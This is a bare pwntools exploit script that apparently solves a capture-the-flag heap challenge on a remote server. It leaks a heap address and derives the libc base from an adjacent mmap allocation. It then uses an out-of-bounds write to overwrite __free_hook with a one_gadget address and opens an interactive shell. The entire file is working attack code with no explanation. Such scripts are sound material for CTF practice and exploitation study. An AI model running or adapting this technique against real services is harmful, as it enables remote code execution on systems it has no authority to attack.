from pwn import * 

context.arch='amd64'
context.log_level='debug'

# cn = process("./bin")
cn = remote("mc.ax", 31547)

# gdb.attach(cn, "b * $rebase(0x000000000000125C)")
cn.sendlineafter("how big?", str(0x300000))
cn.recvuntil("you are here: 0x")

heap = int(cn.recv(12), 16) - 0x10
print("heap: " + hex(heap))

blibc = heap+ 0x301000
print("blibc: " + hex(blibc))

libc = ELF("./libc.so.6")
len = libc.sym['__free_hook'] + 0x301000 - 0x10
print("len: " + hex(len))

cn.sendlineafter("how far?", str(len // 8))
cn.sendlineafter("what?", '0' * 0x800 + str(blibc + 0xe5456))

cn.interactive()
